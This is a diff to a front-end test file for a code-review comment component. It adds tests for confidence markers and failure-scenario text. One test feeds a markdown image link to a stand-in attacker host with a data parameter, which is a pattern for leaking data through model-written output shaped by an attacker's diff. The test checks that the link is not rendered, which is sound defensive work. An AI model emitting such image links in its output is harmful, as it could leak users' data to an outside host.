@@ -3,6 +3,7 @@ import userEvent from "@testing-library/user-event";
 import { http, HttpResponse } from "msw";
 import { describe, expect, it } from "vitest";
 import { server } from "@/mocks/server";
+import { severityEdge } from "@/lib/reviewUtils";
 import { renderWithProviders } from "@/test/renderWithProviders";
 import type { ReviewCommentOut } from "@/types/api";
 import { ReviewComment } from "./ReviewComment";
@@ -20,6 +21,11 @@ function makeComment(overrides: Partial<ReviewCommentOut> = {}): ReviewCommentOu
     comment_text: "This desyncs every line number after a countless hunk.",
     suggestion: null,
     created_at: "2026-07-25T14:32:10Z",
+    // Both default to null — the shape of every comment written before this
+    // milestone, and the majority of rows in a real database. Tests that care
+    // about a value override it.
+    confidence: null,
+    failure_scenario: null,
     my_rating: null,
     ...overrides,
   };
@@ -57,6 +63,101 @@ function recordRatings() {
   );
   return sent;
 }
+
+describe("ReviewComment — confidence and failure scenario", () => {
+  it("marks a plausible finding", () => {
+    renderComment(makeComment({ confidence: "plausible" }));
+
+    expect(screen.getByText("plausible")).toBeInTheDocument();
+  });
+
+  /**
+   * The common case, and the one a marker on every comment would ruin. A
+   * marker that always shows is not a marker — it is noise in the row a reader
+   * scans to triage, pushing severity further from the eye for nothing gained.
+   */
+  it("says nothing for a confirmed finding", () => {
+    renderComment(makeComment({ confidence: "confirmed" }));
+
+    expect(screen.queryByText("plausible")).not.toBeInTheDocument();
+  });
+
+  /**
+   * Every comment written before this milestone, which is most rows in the
+   * database today. Null is not a third value: a comment never asked the
+   * question has not answered "plausible", and marking it would invent a hedge
+   * the model never made.
+   */
+  it("says nothing when confidence is null", () => {
+    renderComment(makeComment({ confidence: null }));
+
+    expect(screen.queryByText("plausible")).not.toBeInTheDocument();
+  });
+
+  it("renders the failure scenario when there is one", () => {
+    renderComment(
+      makeComment({
+        failure_scenario: "With items empty, items[-1] raises IndexError.",
+      }),
+    );
+
+    expect(
+      screen.getByText(/With items empty, items\[-1\] raises IndexError\./),
+    ).toBeInTheDocument();
+    expect(screen.getByText("Fails when")).toBeInTheDocument();
+  });
+
+  /**
+   * Absent, not empty. A null scenario that still rendered its label would put
+   * a heading with nothing under it on the majority of comments in the table.
+   */
+  it("renders no scenario block at all when it is null", () => {
+    renderComment(makeComment({ failure_scenario: null }));
+
+    expect(screen.queryByText("Fails when")).not.toBeInTheDocument();
+  });
+
+  /**
+   * The scenario goes through `ModelProse` like the comment text above it —
+   * the same untrusted string, derived from the same attacker-authored diff.
+   * Backticks become `<code>`; nothing here parses images or links.
+   */
+  it("renders inline code in the scenario without parsing markdown", () => {
+    const { container } = renderWithProviders(
+      <ReviewComment
+        comment={makeComment({
+          failure_scenario:
+            "When `items` is empty ![](https://attacker.test/?d=X) fires.",
+        })}
+        reviewId={REVIEW_ID}
+      />,
+    );
+
+    expect(container.querySelector("code")?.textContent).toBe("items");
+    expect(container.querySelector("img")).toBeNull();
+  });
+
+  /**
+   * The severity-tinted left edge is what makes a file's worst comment
+   * findable while scrolling. It answers "how bad", and confidence answers
+   * "how sure" — mixing them would make a plausible critical look like a
+   * different severity than a confirmed one.
+   */
+  it.each([["plausible"], ["confirmed"], [null]])(
+    "keeps the severity edge driven by severity alone (confidence: %s)",
+    (confidence) => {
+      const { container } = renderWithProviders(
+        <ReviewComment
+          comment={makeComment({ confidence, severity: "critical" })}
+          reviewId={REVIEW_ID}
+        />,
+      );
+
+      const article = container.querySelector("article");
+      expect(article?.className).toContain(severityEdge("critical"));
+    },
+  );
+});
 
 describe("ReviewComment — rating control", () => {
   /**
